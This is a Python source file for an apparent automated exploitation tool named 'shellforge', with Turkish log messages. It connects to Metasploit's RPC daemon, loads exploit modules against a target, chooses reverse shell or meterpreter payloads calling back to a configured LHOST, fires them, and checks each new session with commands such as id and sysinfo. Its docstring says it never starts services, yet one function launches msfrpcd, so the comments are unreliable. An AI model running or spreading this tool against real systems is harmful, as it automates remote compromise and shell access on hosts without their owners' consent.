"""Execution: drive Metasploit over msfrpc to validate and fire candidates.

Responsibilities:

* Connect to a running ``msfrpcd`` (and fail with a clear, actionable message
  if it is not reachable -- shellforge never starts services for you).
* For each candidate exploit: select a compatible reverse payload, optionally
  run ``check()`` as a dry-run, set up the reverse handler, fire once, and wait
  for a session.
* Verify any session that lands by running a harmless command, capture proof,
  and clean up sessions/jobs that shellforge itself started.

The executor only ever touches the single target address handed to it.
"""

from __future__ import annotations

import logging
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any

from .matcher import ExploitCandidate

logger = logging.getLogger("shellforge.executor")


class MsfConnectionError(RuntimeError):
    """Raised when msfrpcd cannot be reached; message tells the user how to start it."""


@dataclass
class AttemptRecord:
    """Audit record for a single exploit attempt."""

    module: str
    payload: str = ""
    lport: int | None = None
    parameters: dict[str, Any] = field(default_factory=dict)
    check_result: str = "not-run"
    fired: bool = False
    success: bool = False
    session_id: int | None = None
    session_type: str = ""
    proof: str = ""
    reason: str = ""
    started_at: str = ""
    finished_at: str = ""

    def to_dict(self) -> dict[str, Any]:
        return self.__dict__.copy()


def connect(
    host: str,
    port: int,
    user: str,
    password: str,
    ssl: bool = True,
) -> Any:
    """Connect to msfrpcd and return a pymetasploit3 client.

    Raises:
        MsfConnectionError: If the daemon is unreachable, with the exact
            command the user should run to start it.
    """
    try:
        from pymetasploit3.msfrpc import MsfRpcClient
    except ImportError as exc:  # pragma: no cover - dependency guard
        raise MsfConnectionError(
            "pymetasploit3 kurulu değil. Çalıştır: pip install -r requirements.txt"
        ) from exc

    try:
        client = MsfRpcClient(
            password, username=user, server=host, port=port, ssl=ssl
        )
        # Touch the API to confirm the handshake really worked.
        _ = client.core.version
    except Exception as exc:  # noqa: BLE001 - surface a friendly hint
        start_cmd = f"msfrpcd -U {user} -P {password} -p {port} -a {host}"
        if not ssl:
            start_cmd += " -S"  # -S disables SSL
        raise MsfConnectionError(
            f"msfrpcd'ye bağlanılamadı ({host}:{port}, ssl={ssl}): {exc}\n\n"
            "shellforge Metasploit servislerini senin yerine başlatmaz. RPC "
            "servisini başka bir terminalde başlat ve tekrar dene:\n\n"
            f"    {start_cmd}\n"
        ) from exc

    logger.info(
        "msfrpcd bağlantısı kuruldu %s (framework %s)",
        f"{host}:{port}",
        client.core.version.get("version", "?"),
    )
    return client


def start_msfrpcd(
    host: str, port: int, user: str, password: str, ssl: bool = True
) -> subprocess.Popen:
    """Launch msfrpcd in the background and return the process handle."""
    cmd = ["msfrpcd", "-U", user, "-P", password, "-p", str(port), "-a", host]
    if not ssl:
        cmd.append("-S")  # -S disables SSL
    logger.info("msfrpcd başlatılıyor: %s", " ".join(cmd))
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def connect_or_start(
    host: str,
    port: int,
    user: str,
    password: str,
    ssl: bool = True,
    boot_timeout: int = 60,
) -> tuple[Any, subprocess.Popen | None]:
    """Connect to msfrpcd, auto-starting the daemon if it is not running.

    Returns:
        ``(client, started_proc)`` where ``started_proc`` is the process this
        function spawned, or ``None`` if a daemon was already running.

    Raises:
        MsfConnectionError: If msfrpcd is not installed, dies on startup, or
            does not become reachable within ``boot_timeout`` seconds.
    """
    # Reuse an already-running daemon if there is one.
    try:
        return connect(host, port, user, password, ssl), None
    except MsfConnectionError:
        logger.info("Çalışan msfrpcd bulunamadı; otomatik başlatılıyor.")

    if shutil.which("msfrpcd") is None:
        raise MsfConnectionError(
            "msfrpcd PATH'te bulunamadı. Metasploit kurulu mu?\n"
            "    Kurulum: sudo apt install metasploit-framework"
        )

    proc = start_msfrpcd(host, port, user, password, ssl)
    deadline = time.time() + boot_timeout
    last_err = ""
    while time.time() < deadline:
        if proc.poll() is not None:
            raise MsfConnectionError(
                f"msfrpcd başlatıldı ama beklenmedik şekilde kapandı "
                f"(çıkış kodu {proc.returncode}). 'msfrpcd' komutunu elle "
                "çalıştırıp hatayı görebilirsin."
            )
        try:
            client = connect(host, port, user, password, ssl)
            logger.info("msfrpcd otomatik başlatıldı ve bağlanıldı.")
            return client, proc
        except MsfConnectionError as exc:
            last_err = str(exc).splitlines()[0]
            time.sleep(3)

    try:
        proc.terminate()
    except Exception:  # noqa: BLE001
        pass
    raise MsfConnectionError(
        f"msfrpcd {boot_timeout} sn içinde hazır olmadı. Son hata: {last_err}"
    )


def _select_payload(exploit: Any, preferences: dict[str, str]) -> str:
    """Choose a reverse payload compatible with ``exploit``.

    Preference order:
        1. The first configured per-platform payload that the module lists as
           compatible.
        2. Any compatible meterpreter ``reverse_tcp`` payload.
        3. Any compatible generic reverse shell.
        4. The module's first compatible payload (last resort).
    """
    try:
        compatible = list(exploit.payloads)
    except Exception:  # noqa: BLE001 - some modules expose no payload list
        compatible = []

    if not compatible:
        # Fall back to the configured generic payload and hope the module accepts it.
        return preferences.get("generic", "generic/shell_reverse_tcp")

    compatible_set = set(compatible)

    for key in ("linux_x64", "linux_x86", "windows_x64", "windows_x86", "generic"):
        candidate = preferences.get(key)
        if candidate and candidate in compatible_set:
            return candidate

    for p in compatible:
        if "meterpreter" in p and "reverse_tcp" in p:
            return p
    for p in compatible:
        if "reverse" in p:
            return p
    return compatible[0]


def _run_check(exploit: Any) -> str:
    """Run a module's ``check()`` as a dry-run. Returns a short status string."""
    try:
        result = exploit.check()
    except Exception as exc:  # noqa: BLE001 - many modules have no check
        return f"unsupported/error: {exc}"
    if isinstance(result, dict):
        return str(result.get("code") or result.get("message") or result)
    return str(result)


def _verify_session(client: Any, sid: int) -> tuple[bool, str, str]:
    """Run a harmless command in session ``sid`` to prove it is live.

    Returns:
        (ok, session_type, proof_output)
    """
    try:
        meta = client.sessions.list.get(str(sid)) or client.sessions.list.get(sid) or {}
        stype = meta.get("type", "")
        session = client.sessions.session(sid)
        if stype == "meterpreter":
            session.runsingle("getuid")
            time.sleep(1)
            proof = session.read() or ""
            if not proof.strip():
                proof = session.run_with_output("sysinfo", timeout=15)
        else:
            session.write("id; uname -a\n")
            time.sleep(2)
            proof = session.read() or ""
        return bool(proof.strip()), stype, proof.strip()
    except Exception as exc:  # noqa: BLE001 - verification is best-effort
        return False, "", f"doğrulama hatası: {exc}"


class Executor:
    """Validates and fires exploit candidates against a single target."""

    def __init__(self, client: Any, target: str, config: dict[str, Any]) -> None:
        self.client = client
        self.target = target
        self.config = config
        self.handler = config.get("handler", {})
        self.exec_cfg = config.get("execution", {})
        self.payload_prefs = config.get("payloads", {})
        # Sessions shellforge opened, so Ctrl+C / cleanup only touches our own.
        self._owned_sessions: set[int] = set()
        self._next_lport = int(self.handler.get("lport_range", [4444, 4454])[0])

    def _pick_lport(self) -> int:
        lo, hi = self.handler.get("lport_range", [4444, 4454])
        lport = self._next_lport
        self._next_lport += 1
        if self._next_lport > int(hi):
            self._next_lport = int(lo)
        return lport

    def _current_session_ids(self) -> set[int]:
        try:
            return {int(k) for k in self.client.sessions.list.keys()}
        except Exception:  # noqa: BLE001
            return set()

    def try_candidate(self, candidate: ExploitCandidate) -> AttemptRecord:
        """Validate (optional) and fire a single candidate once.

        Returns an :class:`AttemptRecord` describing exactly what happened,
        whether or not a session was obtained.
        """
        record = AttemptRecord(
            module=candidate.module,
            started_at=datetime.now().isoformat(timespec="seconds"),
        )
        logger.info("=== Aday: exploit/%s (rank=%s) ===", candidate.module, candidate.rank)

        try:
            exploit = self.client.modules.use("exploit", candidate.module)
        except Exception as exc:  # noqa: BLE001 - module missing/renamed
            record.reason = f"modül yüklenemedi: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            logger.warning("  atlanıyor: %s", record.reason)
            return record

        # Target + port.
        try:
            exploit["RHOSTS"] = self.target
            if candidate.service_port:
                exploit["RPORT"] = candidate.service_port
        except Exception as exc:  # noqa: BLE001
            record.reason = f"hedef seçenekleri ayarlanamadı: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            return record

        # Payload + reverse handler.
        payload = _select_payload(exploit, self.payload_prefs)
        lport = self._pick_lport()
        lhost = self.handler.get("lhost", "")
        record.payload = payload
        record.lport = lport
        record.parameters = {
            "RHOSTS": self.target,
            "RPORT": candidate.service_port,
            "PAYLOAD": payload,
            "LHOST": lhost,
            "LPORT": lport,
        }

        # Dry-run check if enabled and supported.
        if self.exec_cfg.get("check_before_fire", True):
            record.check_result = _run_check(exploit)
            logger.info("  check(): %s", record.check_result)
            # "safe"/"appears" vary per module; we only hard-skip on an explicit
            # "not vulnerable"/"safe" code to avoid wasting an attempt.
            low = record.check_result.lower()
            if "not vulnerable" in low or low == "safe":
                record.reason = f"check hedefi savunmasız bulmadı ({record.check_result})"
                record.finished_at = datetime.now().isoformat(timespec="seconds")
                logger.info("  atlanıyor: %s", record.reason)
                return record

        # Build the payload object with reverse-handler settings.
        try:
            payload_obj = self.client.modules.use("payload", payload)
            payload_obj["LHOST"] = lhost
            payload_obj["LPORT"] = lport
        except Exception as exc:  # noqa: BLE001
            record.reason = f"payload kurulumu başarısız: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            return record

        before = self._current_session_ids()
        logger.info("  ateşleniyor: %s  LHOST=%s LPORT=%s", payload, lhost, lport)
        try:
            exploit.execute(payload=payload_obj)
            record.fired = True
        except Exception as exc:  # noqa: BLE001 - target not suitable, etc.
            record.reason = f"execute() başarısız: {exc}"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            logger.warning("  %s", record.reason)
            return record

        # Poll for a new session (reverse connections take a moment).
        sid = self._wait_for_session(before, timeout=25)
        if sid is None:
            record.reason = "süre içinde oturum açılmadı"
            record.finished_at = datetime.now().isoformat(timespec="seconds")
            logger.info("  %s", record.reason)
            return record

        self._owned_sessions.add(sid)
        ok, stype, proof = _verify_session(self.client, sid)
        record.session_id = sid
        record.session_type = stype
        record.proof = proof
        record.success = ok
        record.reason = (
            "oturum doğrulandı" if ok
            else "oturum açıldı ama doğrulama çıktı üretmedi"
        )
        record.finished_at = datetime.now().isoformat(timespec="seconds")
        logger.info("  OTURUM %s (%s) başarı=%s", sid, stype or "?", ok)
        if proof:
            logger.info("  kanıt:\n%s", proof)
        return record

    def _wait_for_session(self, before: set[int], timeout: int = 25) -> int | None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            now = self._current_session_ids()
            new = now - before
            if new:
                return sorted(new)[0]
            time.sleep(2)
        return None

    def run(self, candidates: list[ExploitCandidate]) -> list[AttemptRecord]:
        """Try candidates in order until a session lands or the budget runs out."""
        max_attempts = int(self.exec_cfg.get("max_attempts", 5))
        delay = int(self.exec_cfg.get("delay_between_attempts", 10))
        records: list[AttemptRecord] = []

        for i, candidate in enumerate(candidates[:max_attempts], start=1):
            logger.info("Deneme %d/%d", i, min(max_attempts, len(candidates)))
            record = self.try_candidate(candidate)
            records.append(record)
            if record.success:
                logger.info("Shell alındı -- aday döngüsü durduruluyor.")
                break
            if i < min(max_attempts, len(candidates)):
                logger.info("Sonraki denemeden önce %d sn bekleniyor...", delay)
                time.sleep(delay)

        return records

    def cleanup(self) -> None:
        """Stop sessions shellforge opened. Does not touch pre-existing ones."""
        for sid in sorted(self._owned_sessions):
            try:
                self.client.sessions.session(sid).stop()
                logger.info("Oturum %s temizlendi", sid)
            except Exception as exc:  # noqa: BLE001 - best effort
                logger.debug("Oturum %s durdurulamadı: %s", sid, exc)
        self._owned_sessions.clear()
